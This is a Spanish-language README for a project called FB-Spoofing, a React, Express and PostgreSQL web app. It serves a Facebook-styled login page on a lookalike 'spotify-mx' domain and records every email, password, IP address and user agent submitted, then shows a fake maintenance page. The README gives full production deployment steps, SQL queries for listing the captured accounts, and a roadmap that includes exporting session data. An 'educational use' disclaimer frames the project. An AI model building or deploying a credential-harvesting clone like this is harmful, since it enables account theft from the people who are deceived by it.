# FB-Spoofing

> **Aviso importante (uso educativo):** Este repositorio se proporciona únicamente con fines educativos y de demostración. Su objetivo es ejemplificar conceptos técnicos relacionados con "spoofing" para aprendizaje, pruebas controladas y actividades de investigación responsables. El autor y colaboradores no apoyan ni promueven el uso malintencionado de este material y no se responsabilizan por acciones ilegales, daños a terceros ni consecuencias derivadas del uso indebido del código. Si vas a usar o adaptar este proyecto, hazlo siempre de forma ética y conforme a la legislación aplicable.

Proyecto Full Stack de demostración con **React + Express.js + PostgreSQL** desplegado en producción.

## 🌐 Producción

**🔗 URL:** https://spotify-mx.publicvm.com

## 🚀 Tecnologías

### Frontend
- ⚛️ React 18.3.1
- ⚡ Vite 5.4.2
- 🎨 CSS moderno con variables personalizadas
- 🎯 Componentes reutilizables (Input, Button, LoginForm)

### Backend
- 🟢 Node.js 20 (Alpine)
- 🚂 Express.js
- 🔒 Seguridad con bcryptjs
- 📝 Validación de datos
- 🛡️ Middleware de manejo de errores

### Base de Datos
- 🐘 PostgreSQL 16 (Alpine)
- 💾 Gestión de usuarios y sesiones
- 🔐 Almacenamiento de IPs y user agents
- ⏰ Tokens de sesión con expiración

### DevOps & Infraestructura
- 🐳 Docker & Docker Compose
- 🌐 Nginx como proxy reverso
- 🔒 SSL/HTTPS con Let's Encrypt
- 📊 pgAdmin para gestión de BD
- 🚀 VPS Ubuntu (Hostinger)
- 🌍 DNS con freedomain.one

## 📁 Estructura del Proyecto

```
FB-Spoofing/
├── client/                          # Frontend React
│   ├── src/
│   │   ├── components/
│   │   │   ├── Input.jsx           # Input reutilizable con validación
│   │   │   ├── Input.css
│   │   │   ├── Button.jsx          # Botón con variantes
│   │   │   ├── Button.css
│   │   │   ├── LoginForm.jsx       # Formulario de login
│   │   │   ├── LoginForm.css
│   │   │   ├── Login.jsx           # Página principal de login
│   │   │   ├── Login.css
│   │   │   ├── Footer.jsx          # Footer estilo Facebook
│   │   │   ├── Footer.css
│   │   │   ├── Maintenance.jsx     # Página post-login
│   │   │   └── Maintenance.css
│   │   ├── colors.css              # Variables de color globales
│   │   ├── App.jsx
│   │   └── main.jsx
│   ├── Dockerfile.prod             # Build optimizado para producción
│   ├── vite.config.js
│   └── package.json
│
├── server/                          # Backend Express
│   ├── src/
│   │   ├── config/
│   │   │   └── database.js         # Pool de PostgreSQL
│   │   ├── models/
│   │   │   ├── User.js             # Modelo de usuarios
│   │   │   └── Session.js          # Modelo de sesiones
│   │   ├── controllers/
│   │   │   └── authController.js   # Lógica de autenticación
│   │   ├── routes/
│   │   │   └── authRoutes.js       # Rutas de API
│   │   ├── middlewares/
│   │   │   ├── errorHandler.js     # Manejo de errores
│   │   │   ├── logger.js           # Logging de requests
│   │   │   └── validateUser.js     # Validación de datos
│   │   └── app.js                  # Configuración de Express
│   ├── index.js                    # Entry point
│   ├── Dockerfile.prod
│   └── package.json
│
├── nginx/                           # Configuración Nginx
│   ├── nginx.conf                  # Config principal
│   └── conf.d/
│       └── app.conf                # Config del sitio
│
├── docker-compose.yml              # Desarrollo local
├── docker-compose.prod.yml         # Producción
├── deploy.sh                       # Script de despliegue automático
├── setup-proxy.sh                  # Configuración de proxy reverso
├── setup-ssl.sh                    # Configuración SSL
├── DEPLOYMENT.md                   # Guía completa de despliegue
├── PROXY-SETUP.md                  # Guía de configuración proxy
├── QUICK-START.md                  # Inicio rápido
└── README.md
```

## �️ Esquema de Base de Datos

### Tabla: usuarios
```sql
CREATE TABLE usuarios (
  id SERIAL PRIMARY KEY,
  email VARCHAR(255) UNIQUE NOT NULL,
  password VARCHAR(255) NOT NULL,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);
```

### Tabla: sessions
```sql
CREATE TABLE sessions (
  id SERIAL PRIMARY KEY,
  user_id INTEGER REFERENCES usuarios(id) ON DELETE CASCADE,
  token VARCHAR(500) UNIQUE NOT NULL,
  ip_address VARCHAR(50),
  user_agent TEXT,
  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  expires_at TIMESTAMP NOT NULL
);
```

## 🌐 API Endpoints

### Autenticación
```
POST /api/auth/login      - Iniciar sesión / Registrar usuario
GET  /api/auth/users      - Listar todos los usuarios
```

**Ejemplo de request:**
```json
{
  "email": "usuario@ejemplo.com",
  "password": "contraseña123"
}
```

**Ejemplo de response:**
```json
{
  "success": true,
  "message": "Inicio de sesión exitoso",
  "data": {
    "id": 1,
    "email": "usuario@ejemplo.com",
    "token": "abc123...",
    "session": {
      "ip_address": "187.246.1.105",
      "user_agent": "Mozilla/5.0...",
      "created_at": "2025-11-04T06:33:45.000Z",
      "expires_at": "2025-11-11T06:33:45.000Z"
    }
  }
}
```

## 🛠️ Desarrollo Local

### Opción 1: Con Docker (Recomendado)

```bash
# Clonar el repositorio
git clone https://github.com/Jesus-Iniesta/FB-Spoofing.git
cd FB-Spoofing

# Iniciar servicios
docker-compose up

# Acceder a:
# - Cliente: http://localhost:3000
# - API: http://localhost:3001
# - PostgreSQL: localhost:5433
# - pgAdmin: http://localhost:5050
```

### Opción 2: Local sin Docker

#### Requisitos
- Node.js 20+
- PostgreSQL 16+

#### Cliente
```bash
cd client
npm install
npm run dev
# → http://localhost:3000
```

#### Servidor
```bash
cd server
npm install

# Configurar .env
cp .env.example .env
# Editar .env con tus credenciales de PostgreSQL

npm run dev
# → http://localhost:3001
```

## 🚀 Despliegue a Producción

### Configuración del Servidor

**Servidor:** VPS Ubuntu (Hostinger)  
**IP:** 77.37.63.94  
**Dominio:** spotify-mx.publicvm.com  
**Puertos:** 8080 (HTTP), 8443 (HTTPS)

### Pasos de Despliegue

1. **Configurar DNS**
   - Registrar dominio en freedomain.one
   - Crear registro A apuntando a 77.37.63.94

2. **Conectar al servidor**
   ```bash
   ssh root@77.37.63.94
   ```

3. **Clonar el proyecto**
   ```bash
   cd /var/www
   git clone https://github.com/Jesus-Iniesta/FB-Spoofing.git
   cd FB-Spoofing
   ```

4. **Configurar variables de entorno**
   ```bash
   cp .env.production.example .env
   nano .env
   # Configurar credenciales de PostgreSQL
   ```

5. **Ejecutar despliegue automático**
   ```bash
   chmod +x deploy.sh
   sudo ./deploy.sh
   ```

6. **Configurar proxy reverso**
   ```bash
   chmod +x setup-proxy.sh
   nano setup-proxy.sh  # Cambiar email
   sudo ./setup-proxy.sh
   ```

7. **Configurar SSL**
   ```bash
   sudo certbot --nginx -d spotify-mx.publicvm.com
   ```

**📚 Documentación completa:** Ver [DEPLOYMENT.md](./DEPLOYMENT.md) y [QUICK-START.md](./QUICK-START.md)

## 🔧 Scripts Disponibles

### Cliente
```bash
npm run dev      # Servidor de desarrollo
npm run build    # Build de producción
npm run preview  # Preview del build
```

### Servidor
```bash
npm start        # Producción
npm run dev      # Desarrollo con hot-reload
```

### Docker
```bash
# Desarrollo
docker-compose up
docker-compose down

# Producción
docker-compose -f docker-compose.prod.yml up -d
docker-compose -f docker-compose.prod.yml down
docker-compose -f docker-compose.prod.yml logs -f
```

## 🗄️ Gestión de Base de Datos

### Conectarse a PostgreSQL
```bash
# En producción
docker exec -it fb-spoofing-db psql -U anonymous -d fb_spoofing

# Comandos útiles
\dt                           # Listar tablas
\d usuarios                   # Ver estructura de tabla
SELECT * FROM usuarios;       # Ver usuarios
SELECT * FROM sessions;       # Ver sesiones
\q                           # Salir
```

### pgAdmin
Acceder a http://localhost:5050 (desarrollo) o http://77.37.63.94:5050 (producción)

**Credenciales:**
- Email: admin@admin.com
- Password: (ver .env)

### Backup
```bash
docker exec fb-spoofing-db pg_dump -U anonymous fb_spoofing > backup.sql
```

## � Características Implementadas

### ✅ Frontend
- [x] Sistema de componentes reutilizables
- [x] Diseño responsive inspirado en Facebook
- [x] Validación de formularios en tiempo real
- [x] Toggle de visibilidad de contraseña
- [x] Página de mantenimiento post-login
- [x] Paleta de colores centralizada
- [x] Optimización de assets

### ✅ Backend
- [x] API RESTful con Express.js
- [x] Autenticación de usuarios
- [x] Hash de contraseñas con bcryptjs
- [x] Gestión de sesiones con tokens
- [x] Registro de IPs y user agents
- [x] Validación de datos de entrada
- [x] Manejo centralizado de errores
- [x] Logging de requests

### ✅ Base de Datos
- [x] PostgreSQL con modelo relacional
- [x] Migraciones automáticas
- [x] Índices para optimización
- [x] Relaciones FK con CASCADE
- [x] Timestamps automáticos

### ✅ DevOps
- [x] Docker multi-stage builds
- [x] Docker Compose para orquestación
- [x] Nginx como proxy reverso
- [x] SSL/HTTPS con Let's Encrypt
- [x] Scripts de despliegue automático
- [x] Healthchecks en contenedores
- [x] Volúmenes para persistencia
- [x] Networks aisladas

### ✅ Seguridad
- [x] HTTPS obligatorio en producción
- [x] Headers de seguridad configurados
- [x] CORS configurado
- [x] Variables de entorno para secrets
- [x] Validación de inputs
- [x] Prevención de inyección SQL

## 📝 Variables de Entorno

### Desarrollo (.env)
```env
# PostgreSQL
POSTGRES_DB=fb_spoofing
POSTGRES_USER=anonymous
POSTGRES_PASSWORD=tu_contraseña

# pgAdmin
PGADMIN_DEFAULT_EMAIL=admin@admin.com
PGADMIN_DEFAULT_PASSWORD=admin

# Server
NODE_ENV=development
PORT=3001
DB_HOST=postgres
DB_PORT=5432
```

### Producción (.env.production)
```env
POSTGRES_DB=fb_spoofing
POSTGRES_USER=anonymous
POSTGRES_PASSWORD=contraseña_segura_producción

NODE_ENV=production
PORT=3001
DB_HOST=postgres
DB_PORT=5432

DOMAIN=spotify-mx.publicvm.com
```

## � Comandos Útiles

### Logs
```bash
# Ver logs en tiempo real
docker-compose -f docker-compose.prod.yml logs -f

# Logs de un servicio específico
docker-compose -f docker-compose.prod.yml logs server
docker-compose -f docker-compose.prod.yml logs client
docker-compose -f docker-compose.prod.yml logs postgres
```

### Mantenimiento
```bash
# Reiniciar servicios
docker-compose -f docker-compose.prod.yml restart

# Reconstruir imágenes
docker-compose -f docker-compose.prod.yml build --no-cache

# Limpiar volúmenes
docker-compose -f docker-compose.prod.yml down -v

# Ver uso de recursos
docker stats
```

### Actualización
```bash
# En el servidor VPS
cd /var/www/FB-Spoofing
git pull origin main
docker-compose -f docker-compose.prod.yml down
docker-compose -f docker-compose.prod.yml build --no-cache
docker-compose -f docker-compose.prod.yml up -d
```

## � Roadmap

### Próximas Funcionalidades
- [ ] Panel de administración
- [ ] Exportación de datos de sesiones
- [ ] Gráficas de actividad de usuarios
- [ ] Rate limiting para prevenir ataques
- [ ] Sistema de notificaciones
- [ ] Tests unitarios y de integración
- [ ] CI/CD con GitHub Actions
- [ ] Monitoreo con Prometheus/Grafana
- [ ] Backup automático de BD

### Mejoras de Seguridad
- [ ] Autenticación de dos factores (2FA)
- [ ] Captcha en formularios
- [ ] Detección de IPs sospechosas
- [ ] Logs de auditoría
- [ ] Rotación automática de tokens

## 🤝 Contribución

Este es un proyecto educativo. Si encuentras bugs o tienes sugerencias:

1. Fork el proyecto
2. Crea una rama (`git checkout -b feature/amazing-feature`)
3. Commit tus cambios (`git commit -m 'Add amazing feature'`)
4. Push a la rama (`git push origin feature/amazing-feature`)
5. Abre un Pull Request

## 📄 Licencia

Este proyecto es solo para fines educativos y de demostración.

## 👨‍💻 Autor

Creado por **Jesús Iniesta**

- GitHub: [@Jesus-Iniesta](https://github.com/Jesus-Iniesta)
- Email: iniestavalverdejesus4@gmail.com

---

**⚠️ Recordatorio:** Este proyecto es únicamente para fines educativos. Úsalo de manera responsable y ética.
